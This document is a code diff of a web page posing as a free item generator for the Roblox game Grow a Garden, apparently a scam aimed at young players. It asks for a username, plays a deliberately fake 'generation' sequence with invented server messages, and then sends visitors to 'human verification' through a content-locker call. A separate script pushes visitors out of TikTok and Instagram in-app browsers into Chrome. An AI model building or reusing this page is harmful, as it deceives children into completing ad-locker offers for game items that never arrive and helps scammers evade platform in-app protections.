+                <!-- Fruit Card: Giant Pinecone -->
+                <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+                    <div>
+                        <img alt="Candy Blossom" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover" src="https://static.wikia.nocookie.net/growagarden/images/e/e9/Giant_pinecone.png"/>
+                    </div>
+                    <div>
+                        <p class="text-xl md:text-2xl font-bold mb-2 font-fredoka item-title-stroke">Giant Pinecone</p>
+                        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+                        <div class="mt-3 flex items-center justify-center bg-green-600 rounded-full p-1">
+                            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+                            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+                            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- Fruit Card: Candy Blossom -->
+                <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+                    <div>
+                        <img alt="Candy Blossom" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover" src="https://static.wikia.nocookie.net/growagarden/images/5/52/CandyBlossomPic.png"/>
+                    </div>
+                    <div>
+                        <p class="text-xl md:text-2xl font-bold mb-2 font-fredoka item-title-stroke">Candy Blossom</p>
+                        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+                        <div class="mt-3 flex items-center justify-center bg-green-600 rounded-full p-1">
+                            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+                            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+                            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- Fruit Card: Burning Bud -->
+                <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+                    <div>
+                        <img alt="Burning Bud" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover" src="https://static.wikia.nocookie.net/growagarden/images/9/98/Burning_Bud.png"/>
+                    </div>
+                    <div>
+                        <p class="text-xl md:text-2xl font-bold mb-2 font-fredoka item-title-stroke">Burning Bud</p>
+                        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+                        <div class="mt-3 flex items-center justify-center bg-green-600 rounded-full p-1">
+                            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+                            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+                            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- Fruit Card: Dragon Pepper -->
+                <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+                    <div>
+                        <img alt="Dragon Pepper" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover" src="https://static.wikia.nocookie.net/growagarden/images/6/62/DragonPepperIcon.png"/>
+                    </div>
+                    <div>
+                        <p class="text-xl md:text-2xl font-bold mb-2 font-fredoka item-title-stroke">Dragon Pepper</p>
+                        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+                        <div class="mt-3 flex items-center justify-center bg-green-600 rounded-full p-1">
+                            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+                            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+                            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- Fruit Card: Moon Melon -->
+                <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+                    <div>
+                        <img alt="Moon Melon" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover" src="https://static.wikia.nocookie.net/growagarden/images/7/7a/MoonMelon.png"/>
+                    </div>
+                    <div>
+                        <p class="text-xl md:text-2xl font-bold mb-2 font-fredoka item-title-stroke">Moon Melon</p>
+                        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+                        <div class="mt-3 flex items-center justify-center bg-green-600 rounded-full p-1">
+                            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+                            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+                            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- Fruit Card: Sunflower Seed -->
+                <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+                    <div>
+                        <img alt="Sunflower Seed" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover" src="https://static.wikia.nocookie.net/growagarden/images/c/c0/Sunflower_Produce_.png"/>
+                    </div>
+                    <div>
+                        <p class="text-xl md:text-2xl font-bold mb-2 font-fredoka item-title-stroke">Sunflower Seed</p>
+                        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+                        <div class="mt-3 flex items-center justify-center bg-green-600 rounded-full p-1">
+                            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+                            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+                            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- Fruit Card: Sugar Apple -->
+                <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+                    <div>
+                        <img alt="Sugar Apple" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover" src="https://static.wikia.nocookie.net/growagarden/images/a/a7/SugarAppleIcon.png"/>
+                    </div>
+                    <div>
+                        <p class="text-xl md:text-2xl font-bold mb-2 font-fredoka item-title-stroke">Sugar Apple</p>
+                        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+                        <div class="mt-3 flex items-center justify-center bg-green-600 rounded-full p-1">
+                            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+                            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+                            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- Fruit Card: Feijoa -->
+                <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+                    <div>
+                        <img alt="Feijoa" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover" src="https://static.wikia.nocookie.net/growagarden/images/5/54/FeijoaIcon.png"/>
+                    </div>
+                    <div>
+                        <p class="text-xl md:text-2xl font-bold mb-2 font-fredoka item-title-stroke">Feijoa</p>
+                        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+                        <div class="mt-3 flex items-center justify-center bg-green-600 rounded-full p-1">
+                            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+                            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+                            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- Fruit Card: Loquat -->
+                <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+                    <div>
+                        <img alt="Loquat" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover" src="https://static.wikia.nocookie.net/growagarden/images/9/9d/LoquatProduce.png"/>
+                    </div>
+                    <div>
+                        <p class="text-xl md:text-2xl font-bold mb-2 font-fredoka item-title-stroke">Loquat</p>
+                        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+                        <div class="mt-3 flex items-center justify-center bg-green-600 rounded-full p-1">
+                            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+                            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+                            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- Fruit Card: Prickly Pear -->
+                <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+                    <div>
+                        <img alt="Prickly Pear" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover" src="https://static.wikia.nocookie.net/growagarden/images/3/33/PricklyPear.png"/>
+                    </div>
+                    <div>
+                        <p class="text-xl md:text-2xl font-bold mb-2 font-fredoka item-title-stroke">Prickly Pear</p>
+                        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+                        <div class="mt-3 flex items-center justify-center bg-green-600 rounded-full p-1">
+                            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+                            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+                            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </div>
+    <!-- Username Modal -->
+    <div class="hidden fixed inset-0 z-50 flex items-center justify-center p-4 modal-backdrop" id="username-modal">
+        <div class="bg-white rounded-2xl shadow-2xl p-8 max-w-sm w-full text-gray-800">
+            <h3 class="text-2xl font-bold mb-4 text-center font-fredoka text-green-600">Enter Your Username</h3>
+            <p class="text-center mb-6 text-gray-600">Please enter your username to claim your item.</p>
+            <input class="w-full px-4 py-2 border border-gray-300 rounded-lg mb-1 focus:outline-none focus:ring-2 focus:ring-green-500" id="username-input" placeholder="Your Username" type="text"/>
+            <p class="text-red-500 text-sm h-4 mb-2" id="username-error"></p>
+            <button class="w-full bg-green-500 text-white font-bold py-3 px-6 rounded-lg hover:bg-green-600 transition-colors" id="submit-username-btn">Submit</button>
+            <button class="w-full bg-gray-200 text-gray-700 font-bold py-2 px-6 rounded-lg hover:bg-gray-300 transition-colors mt-2" id="close-modal-btn">Cancel</button>
         </div>
-      `;
-      
-      // Use API to search for user
-      fetch(`https://abadaoucht.com/tiktok/api/roblox/userinfo/${username}`)
-        .then(response => response.json())
-        .then(data => {
-          if (data.status === "SUCCESS") {
-            showSuccessState(username, data.avatar, itemName, itemImage);
-          } else {
-            showErrorState(username, itemName, itemImage);
-          }
-        })
-        .catch(error => {
-          console.error('Error:', error);
-          showErrorState(username, itemName, itemImage);
+    </div>
+    <!-- Generator Modal -->
+    <div class="hidden fixed inset-0 z-50 flex items-center justify-center p-4 modal-backdrop" id="generator-modal">
+        <div class="bg-white rounded-2xl shadow-2xl p-8 max-w-md w-full text-gray-800 text-center">
+            <h3 class="text-3xl font-bold mb-4 text-green-600 font-fredoka animate-pulse" id="generator-title">Generating Items...</h3>
+            <div class="relative w-20 h-20 mx-auto mb-4">
+                <div class="absolute w-full h-full border-4 border-green-300 rounded-full animate-spin" style="border-top-color: #10b981;"></div>
+                <img class="absolute inset-0 w-12 h-12 m-auto animate-bounce" id="loading-item-img" src="https://static.wikia.nocookie.net/growagarden/images/8/8f/PrimalEgg.png"/>
+            </div>
+            <div class="progress-bar mb-4 bg-gray-200 rounded-full h-4 overflow-hidden">
+                <div class="progress-fill text-white text-sm text-center" id="progress-fill" style="width: 0%; line-height: 1rem;">0%</div>
+            </div>
+            <p class="text-gray-600 text-sm italic mb-4" id="game-tip"></p>
+            <button class="hidden w-full bg-blue-500 text-white font-bold py-3 px-6 rounded-lg hover:bg-blue-600 transition-colors" id="verify-btn">Verify Now</button>
+        </div>
+    </div>
+    <script>
+        // --- Countdown Timer ---
+        document.addEventListener('DOMContentLoaded', () => {
+            const countdownElement = document.getElementById('countdown-timer');
+            let timeInSeconds = 120; // 2 minutes
+
+            const timer = setInterval(() => {
+                const minutes = Math.floor(timeInSeconds / 60);
+                let seconds = timeInSeconds % 60;
+
+                seconds = seconds < 10 ? '0' + seconds : seconds;
+
+                countdownElement.textContent = `${minutes}:${seconds}`;
+
+                if (timeInSeconds <= 0) {
+                    clearInterval(timer);
+                    countdownElement.textContent = "Time's up!";
+                }
+
+                timeInSeconds--;
+            }, 1000);
         });
-    }
 
-    // Function to show success state
-    const showSuccessState = (username, avatarUrl, itemName, itemImage) => {
-      const popupContent = document.querySelector('.popup-content');
-      
-      popupContent.innerHTML = `
-        <div class="popup-header">
-          <h3>Get Item</h3>
-        </div>
-        <div style="text-align:center;padding:20px">
-          <img src="${avatarUrl}" class="result-avatar">
-          <p class="result-username">@${username}</p>
-          <button class="get-item-now-btn">Continue</button>
-        </div>
-      `;
-      
-      popupContent.querySelector('.get-item-now-btn').addEventListener('click', function() {
-        // Play sound when clicking "Continue" button
-        const clickSound = document.getElementById('clickSound');
-        clickSound.currentTime = 0;
-        clickSound.play();
-        showVerificationState(username, itemName, itemImage);
-      });
-    }
+        // --- Keep old logic working, just add dynamic sequence ---
+        let selectedItemImg = "https://static.wikia.nocookie.net/growagarden/images/8/8f/PrimalEgg.png";
 
-    // Function to show verification state
-    const showVerificationState = (username, itemName, itemImage) => {
-      const popupContent = document.querySelector('.popup-content');
-      
-      popupContent.innerHTML = `
-        <div class="popup-header">
-          <h3>Verification</h3>
-        </div>
-        <div style="text-align:center;padding:20px">
-          <div class="folding">
-            <div class="sk-cube1 sk-cube"></div>
-            <div class="sk-cube2 sk-cube"></div>
-            <div class="sk-cube4 sk-cube"></div>
-            <div class="sk-cube3 sk-cube"></div>
-            <div class="square"></div>
-          </div>
-          <p class="searching-text">Transferring ${itemName} to @${username}</p>
-        </div>
-      `;
-      
-      // After 3 seconds, activate AdBlueMedia lock
-      setTimeout(() => {
-        _yy(); // Activate AdBlueMedia lock
-        closePurchasePopup();
-      }, 3000);
-    }
+        const claimButtons = document.querySelectorAll('.claim-btn');
+        const usernameModal = document.getElementById('username-modal');
+        const closeModalBtn = document.getElementById('close-modal-btn');
+        const submitUsernameBtn = document.getElementById('submit-username-btn');
+        const usernameInput = document.getElementById('username-input');
+        const usernameError = document.getElementById('username-error');
+        const loadingItemImg = document.getElementById('loading-item-img');
 
-    // Function to show error state
-    const showErrorState = (username, itemName, itemImage) => {
-      const popupContent = document.querySelector('.popup-content');
-      
-      popupContent.innerHTML = `
-        <div class="popup-header">
-          <h3>Error</h3>
-        </div>
-        <div style="text-align:center;padding:20px">
-          <p class="searching-text" style="color: #ff6b6b;">User @${username} not found</p>
-          <button class="get-item-now-btn" id="retry-btn">Try Again</button>
-        </div>
-      `;
-      
-      popupContent.querySelector('#retry-btn').addEventListener('click', function() {
-        showPurchasePopup(itemName, itemImage);
-      });
-    }
+        // Open Username Modal & detect clicked item
+        claimButtons.forEach(button => {
+            button.addEventListener('click', () => {
+                const card = button.closest('.card-bg');
+                const img = card.querySelector('img');
+                if (img) selectedItemImg = img.src;
+                usernameModal.classList.remove('hidden');
+            });
+        });
 
-    // Add golden item effect and sound
-    $(document).ready(function() {
-      const dingSound = document.getElementById('dingSound');
-      let soundEnabled = true;
-      
-      $('.item-card').click(function() {
-        // Remove selection from all items
-        $('.item-card').removeClass('selected');
-        
-        // Add selection to the clicked item
-        $(this).addClass('selected');
-        
-        // Play sound
-        dingSound.currentTime = 0;
-        dingSound.play();
-        
-        // Open purchase popup
-        const itemName = $(this).find('.item-name').text().trim();
-        const itemImage = $(this).find('.item-img').attr('src');
-        showPurchasePopup(itemName, itemImage);
-      });
-    });
-  </script>
+        // Close Username Modal
+        closeModalBtn.addEventListener('click', () => {
+            usernameModal.classList.add('hidden');
+            usernameInput.value = '';
+            usernameError.textContent = '';
+        });
+
+        // Submit Username & Start Generator
+        submitUsernameBtn.addEventListener('click', () => {
+            const username = usernameInput.value.trim();
+            if (username !== '') {
+                usernameModal.classList.add('hidden');
+                usernameError.textContent = '';
+                loadingItemImg.src = selectedItemImg;
+                runFakeGenerator(username);
+            } else {
+                usernameError.textContent = 'Please enter a valid username.';
+            }
+        });
+
+        // --- Smooth Generator with 3-step sequence ---
+        async function runFakeGenerator(username) {
+            const generatorModal = document.getElementById('generator-modal');
+            const progressFill = document.getElementById('progress-fill');
+            const verifyBtn = document.getElementById('verify-btn');
+            const gameTip = document.getElementById('game-tip');
+            const generatorTitle = document.getElementById('generator-title');
+
+            generatorModal.classList.remove('hidden');
+            progressFill.style.width = "0%";
+            progressFill.textContent = "0%";
+            verifyBtn.classList.add('hidden');
+
+            let progress = 0;
+            generatorTitle.textContent = "> Connecting to Grow a Garden servers...";
+            gameTip.textContent = "";
+
+            await new Promise(r => setTimeout(r, 1500));
+            generatorTitle.textContent = `> Finding user: ${username}...`;
+            
+            await new Promise(r => setTimeout(r, 2000));
+            generatorTitle.textContent = "> User found. Preparing to generate items...";
+
+            while (progress < 100) {
+                await new Promise(r => setTimeout(r, 100));
+                progress += Math.floor(Math.random() * 5) + 1;
+                if (progress > 100) progress = 100;
+                progressFill.style.width = progress + "%";
+                progressFill.textContent = progress + "%";
+            }
+
+            setTimeout(() => {
+                generatorTitle.textContent = "Generation complete.";
+                gameTip.textContent = "Human verification required to prevent abuse.";
+                verifyBtn.classList.remove('hidden');
+            }, 500);
+        }
+    </script>
+    <script>
+        // --- Quantity Buttons (+ and - fully working) ---
+        document.querySelectorAll('.card-bg').forEach(card => {
+            const minusBtn = card.querySelector('.quantity-minus');
+            const plusBtn = card.querySelector('.quantity-plus');
+            const quantityDisplay = card.querySelector('.quantity-display');
+            let quantity = 0;
+
+            if (minusBtn && plusBtn && quantityDisplay) {
+                minusBtn.addEventListener('click', () => {
+                    if (quantity > 0) {
+                        quantity--;
+                        quantityDisplay.textContent = quantity;
+                    }
+                });
+                plusBtn.addEventListener('click', () => {
+                    quantity++;
+                    quantityDisplay.textContent = quantity;
+                });
+            }
+        });
+    </script>
+    <script>
+        document.addEventListener("DOMContentLoaded", function(){
+            const verifyBtn = document.getElementById('verify-btn');
+            if (verifyBtn) {
+                verifyBtn.addEventListener('click', function(){
+                    _Kx(); // Open locker when Verify is clicked
+                });
+            }
+        });
+    </script>
+    <script>
+        // Floating items script
+        document.addEventListener('DOMContentLoaded', () => {
+            const container = document.createElement('div');
+            container.id = 'floating-items-container';
+            document.body.prepend(container);
+
+            const items = [
+                'https://static.wikia.nocookie.net/growagarden/images/5/54/Raccon_Better_Quality.png', // Raccoon
+                'https://static.wikia.nocookie.net/growagarden/images/5/52/CandyBlossomPic.png', // Candy Blossom
+                'https://static.wikia.nocookie.net/growagarden/images/c/c9/DragonflyIcon.png', // Dragonfly
+                'https://static.wikia.nocookie.net/growagarden/images/f/f8/T-Rex.png', // T-Rex
+                'https://static.wikia.nocookie.net/growagarden/images/4/4d/Kitsune_.png' // Moon Melon
+            ];
+
+            const itemCount = 15;
+
+            for (let i = 0; i < itemCount; i++) {
+                const img = document.createElement('img');
+                img.src = items[Math.floor(Math.random() * items.length)];
+                img.classList.add('floating-item');
+                
+                const size = Math.random() * 60 + 40; // size between 40px and 100px
+                img.style.width = `${size}px`;
+                img.style.height = 'auto';
+
+                const animationName = `float${Math.floor(Math.random() * 3) + 1}`;
+                img.style.animationName = animationName;
+                
+                const animationDuration = Math.random() * 20 + 15; // duration between 15s and 35s
+                img.style.animationDuration = `${animationDuration}s`;
+                
+                const animationDelay = Math.random() * -35; // negative delay
+                img.style.animationDelay = `${animationDelay}s`;
+
+                container.appendChild(img);
+            }
+        });
+    </script>
+  <script>
+    (function() {
+        // List of user agents for known in-app browsers
+        const inAppBrowserRegex = /MESSENGER|FBAN|FBAV|Instagram|WebView|musical_ly|TikTok/i;
+
+        const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+
+        // Check if the user is inside a known in-app browser
+        if (inAppBrowserRegex.test(userAgent)) {
+            
+            // --- Strategy for Android ---
+            // It uses a special "intent" URL to force open in a real browser
+            if (/android/i.test(userAgent)) {
+                const currentUrl = window.location.href;
+                // Try to open in Chrome, the most common Android browser
+                const intentUrl = "intent:" + currentUrl.substring(currentUrl.indexOf(':') + 1) + "#Intent;scheme=https;package=com.android.chrome;end";
+                window.location.href = intentUrl;
+            } 
+            
+            // --- Strategy for iOS ---
+            // iOS is more restrictive. We can't force a browser open.
+            // The best approach is to inform the user to do it manually.
+            else if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
+                // You can show a message to the user here.
+                // For this to work, you need to add a hidden HTML element.
+                const iosPrompt = document.getElementById('ios-redirect-prompt');
+                if (iosPrompt) {
+                    iosPrompt.style.display = 'block';
+                }
+            }
+        }
+    })();
+    </script>
 </body>
+
 </html>
